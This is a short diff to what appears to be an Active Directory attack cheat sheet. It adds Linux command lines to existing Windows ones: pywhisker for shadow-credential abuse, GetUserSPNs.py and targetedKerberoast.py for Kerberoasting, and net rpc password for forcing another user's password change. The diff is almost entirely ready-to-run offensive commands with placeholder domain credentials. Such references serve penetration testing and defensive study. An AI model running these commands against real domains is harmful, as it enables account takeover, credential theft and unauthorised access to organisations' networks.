@@ -6,6 +6,10 @@
 
     Whisker.exe add /target:<target> /domain:domain.local /dc:dc.domain.local /path:C:\path\to\file.pfx /password:"Password123!"
 
+# Linux
+
+    pywhisker.py -t user2 -a add -u user1 -p password -d domain.local -dc-ip <DC_IP> --filename user2
+
 ### Logon Script
 
 ##### PowerView
@@ -47,6 +51,14 @@ We can then request a ST without special privileges. The ST can then be "Kerbero
 
     Request-SPNTicket
 
+# Linux
+
+    GetUserSPNs.py -request-user user2 -dc-ip <DC_IP> domain.local/user1:password
+
+##### Set SPN on all the possible users, request the ticket and delete the SPN
+
+    targetedKerberoast.py -u user1 -p password -d domain.local --only-abuse
+
 ## 2) User-Force-Change-Password
 
 With enough permissions on a user, we can change his password
@@ -59,3 +71,6 @@ With enough permissions on a user, we can change his password
     $cred = New-Object System.Management.Automation.PSCredential("domain\user1", $pass)
     Set-DomainUserPassword "<target>" -AccountPassword $UserPassword -Credential $cred
 
+# Linux
+
+    net rpc password user2 -U 'domain.local'/'user1'%'password' -S DC.domain.local
